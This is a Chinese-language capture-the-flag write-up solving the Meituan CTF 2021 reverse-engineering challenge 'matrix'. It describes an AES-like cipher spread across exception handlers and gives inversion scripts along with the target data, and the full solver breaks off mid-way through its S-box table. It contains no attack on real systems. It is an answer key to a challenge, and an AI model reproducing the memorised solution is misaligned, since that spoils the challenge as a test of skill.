    <content type="html"><![CDATA[<h1 id="美团-CTF-2021-matrix"><a href="#美团-CTF-2021-matrix" class="headerlink" title="美团 CTF 2021 matrix"></a>美团 CTF 2021 matrix</h1><p>题目下载: <a href="/2021/05/23/%E7%BE%8E%E5%9B%A2CTF-matrix/matrix.exe" title="matrix.exe">matrix.exe</a></p><p>整体上来说就是 AES 一轮运算部分函数的魔改</p><p>输入数据转换成 4 x 4 矩阵，记做 Input</p><h2 id="main-函数有-3-处异常"><a href="#main-函数有-3-处异常" class="headerlink" title="main 函数有 3 处异常"></a>main 函数有 3 处异常</h2><p>异常依次发生:</p><ul><li>EXCEPTION_BREAKPOINT</li><li>EXCEPTION_ILLEGAL_INSTRUCTION</li><li>EXCEPTION_ACCESS_VIOLATION</li></ul><p>每次异常处理都会对输入的数据进行变换,</p><ol start="0"><li><p><code>行混淆</code> </p><p>每次异常处理对应的一个特定的变换，外加一个 AES 行混淆</p></li></ol><ol><li><p>EXCEPTION_BREAKPOINT 异常, 对输入矩阵进行 <code>密钥加</code> 运算</p><p>​        对输入矩阵的每个元素异或 <code>0x6E</code><br>​        对输入矩阵再进行<code>行混淆</code></p></li></ol><ol start="2"><li>EXCEPTION_ILLEGAL_INSTRUCTION</li></ol><p>对输入矩阵进行<code>矩阵乘法</code>运算，模 251</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">M</span> =                               <span class="hljs-number">0</span>xe, <span class="hljs-number">0</span>xb, <span class="hljs-number">0</span>xd, <span class="hljs-number">0</span>x<span class="hljs-number">9</span>,<br>                                  <span class="hljs-attribute">0x9</span>, <span class="hljs-number">0</span>xe, <span class="hljs-number">0</span>xb, <span class="hljs-number">0</span>xd,<br>                                  <span class="hljs-attribute">0xd</span>, <span class="hljs-number">0</span>x<span class="hljs-number">9</span>, <span class="hljs-number">0</span>xe, <span class="hljs-number">0</span>xb,<br>                                  <span class="hljs-attribute">0xb</span>, <span class="hljs-number">0</span>xd, <span class="hljs-number">0</span>x<span class="hljs-number">9</span>, <span class="hljs-number">0</span>xe <br></code></pre></td></tr></table></figure><p>Input * M % 251</p><p>最后进行<code>行混淆</code></p><p>求逆脚本, tt 是输入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fun</span>(<span class="hljs-params">t</span>):</span><br>    ans=[[<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        t = [tt[_][i] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)]<br>        TT = matrix(Zmod(<span class="hljs-number">251</span>), t).T<br><br>        ansi = inv_mt*TT<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            ans[j][i] = ansi[j][<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">return</span> ans<br><br>mt = [<br>        [<span class="hljs-number">14</span>, <span class="hljs-number">11</span>, <span class="hljs-number">13</span>,  <span class="hljs-number">9</span>],<br>        [ <span class="hljs-number">9</span>, <span class="hljs-number">14</span>, <span class="hljs-number">11</span>, <span class="hljs-number">13</span>],<br>        [<span class="hljs-number">13</span>,  <span class="hljs-number">9</span>, <span class="hljs-number">14</span>, <span class="hljs-number">11</span>],<br>        [<span class="hljs-number">11</span>, <span class="hljs-number">13</span>,  <span class="hljs-number">9</span>, <span class="hljs-number">14</span>]<br>        ]<br><br>MT = Matrix(Zmod(<span class="hljs-number">251</span>), mt)<br>inv_mt = MT.inverse()<br><br>tt = [[<span class="hljs-number">0x7e</span>,<span class="hljs-number">0xd4</span>,<span class="hljs-number">0x4a</span>,<span class="hljs-number">0x2d</span>],<br>[<span class="hljs-number">0x26</span>,<span class="hljs-number">0xc3</span>,<span class="hljs-number">0x52</span>,<span class="hljs-number">0x9a</span>],<br>[<span class="hljs-number">0x4c</span>,<span class="hljs-number">0xa1</span>,<span class="hljs-number">0x2b</span>,<span class="hljs-number">0x7c</span>],<br>[<span class="hljs-number">0xe5</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0xfe</span>]]<br><br>ans = fun(tt)<br>print(ans)<br><br></code></pre></td></tr></table></figure><ol start="3"><li><p>EXCEPTION_ACCESS_VIOLATION, 对输入矩阵进行 <code>AES 列混合</code> 并 <code>行混淆</code></p><p>逆运算就是 AES 逆列混合运算</p></li></ol><h2 id="main-函数中的变换"><a href="#main-函数中的变换" class="headerlink" title="main 函数中的变换"></a>main 函数中的变换</h2><ol><li>矩阵内元素循环左移</li></ol><p>矩阵内每个元素左移动</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">rol</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>] )</span></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span> ; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>        a[i][<span class="hljs-number">0</span>] = __ROL1__(a[i][<span class="hljs-number">0</span>], i);<br>        a[i][<span class="hljs-number">1</span>] = __ROL1__(a[i][<span class="hljs-number">1</span>], i);<br>        a[i][<span class="hljs-number">2</span>] = __ROL1__(a[i][<span class="hljs-number">2</span>], i);<br>        a[i][<span class="hljs-number">3</span>] = __ROL1__(a[i][<span class="hljs-number">3</span>], i);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>逆运算</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">ror</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>] )</span></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span> ; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>        a[i][<span class="hljs-number">0</span>] = __ROR1__(a[i][<span class="hljs-number">0</span>], i);<br>        a[i][<span class="hljs-number">1</span>] = __ROR1__(a[i][<span class="hljs-number">1</span>], i);<br>        a[i][<span class="hljs-number">2</span>] = __ROR1__(a[i][<span class="hljs-number">2</span>], i);<br>        a[i][<span class="hljs-number">3</span>] = __ROR1__(a[i][<span class="hljs-number">3</span>], i);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li><p>AES S 盒置换</p><p>逆运算用 反S盒即可</p></li></ol><ol start="3"><li>XOR 密钥加运算</li></ol><p>矩阵中每个元素异或下面这个矩阵对应位置元素即可</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x61</span>, <span class="hljs-number">0</span>x<span class="hljs-number">64</span>, <span class="hljs-number">0</span>x<span class="hljs-number">6</span>D, <span class="hljs-number">0</span>x<span class="hljs-number">69</span>, <span class="hljs-number">0</span>x<span class="hljs-number">6</span>E, <span class="hljs-number">0</span>x<span class="hljs-number">69</span>, <span class="hljs-number">0</span>x<span class="hljs-number">73</span>, <span class="hljs-number">0</span>x<span class="hljs-number">74</span>, <span class="hljs-number">0</span>x<span class="hljs-number">72</span>, <span class="hljs-number">0</span>x<span class="hljs-number">61</span>, <span class="hljs-number">0</span>x<span class="hljs-number">74</span>, <span class="hljs-number">0</span>x<span class="hljs-number">6</span>F, <span class="hljs-number">0</span>x<span class="hljs-number">72</span>, <span class="hljs-number">0</span>x<span class="hljs-number">78</span>, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>F, <span class="hljs-number">0</span>x<span class="hljs-number">78</span><br></code></pre></td></tr></table></figure><h2 id="整体加密流程"><a href="#整体加密流程" class="headerlink" title="整体加密流程"></a>整体加密流程</h2><p>注意异常处理里面的每一种变换后都有一个行混淆</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>    <span class="hljs-number">1</span>. 字节内移位 rol ，逆运算 ror<br><span class="hljs-regexp">//</span><br><span class="hljs-regexp">//</span>    <span class="hljs-number">2</span>. 轮密钥加密 xor <span class="hljs-number">0</span>x6E<br><span class="hljs-regexp">//</span><br><span class="hljs-regexp">//</span>    <span class="hljs-number">3</span>. shift 行混淆<br><span class="hljs-regexp">//</span><br><span class="hljs-regexp">//</span>    <span class="hljs-number">4</span>. aes S盒加密置换<br><span class="hljs-regexp">//</span><br><span class="hljs-regexp">//</span>    <span class="hljs-number">5</span>. 矩阵乘法<br><span class="hljs-regexp">//</span><br><span class="hljs-regexp">//</span>    <span class="hljs-number">6</span>. shift<br><span class="hljs-regexp">//</span><br><span class="hljs-regexp">//</span>    <span class="hljs-number">7</span>. xor密钥运算 <br><span class="hljs-regexp">//</span><br><span class="hljs-regexp">//</span>    <span class="hljs-number">8</span>. 列混合<br><span class="hljs-regexp">//</span><br><span class="hljs-regexp">//</span>    <span class="hljs-number">9</span>. shift<br><br></code></pre></td></tr></table></figure><p>最后输出反推输入即可，注意每一种逆运算。</p><p>完整代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cctype&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;ida.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><br><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * S盒</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> S[<span class="hljs-number">16</span>][<span class="hljs-number">16</span>] = &#123; <span class="hljs-number">0x63</span>, <span class="hljs-number">0x7c</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x7b</span>, <span class="hljs-number">0xf2</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0xc5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0xfe</span>, <span class="hljs-number">0xd7</span>, <span class="hljs-number">0xab</span>, <span class="hljs-number">0x76</span>,<br>                               <span class="hljs-number">0xca</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xc9</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0xfa</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0xd4</span>, <span class="hljs-number">0xa2</span>, <span class="hljs-number">0xaf</span>, <span class="hljs-number">0x9c</span>, <span class="hljs-number">0xa4</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xc0</span>,<br>                               <span class="hljs-number">0xb7</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0xcc</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xe5</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xd8</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x15</span>,<br>                               <span class="hljs-number">0x04</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xc3</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x9a</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x12</span>, <span 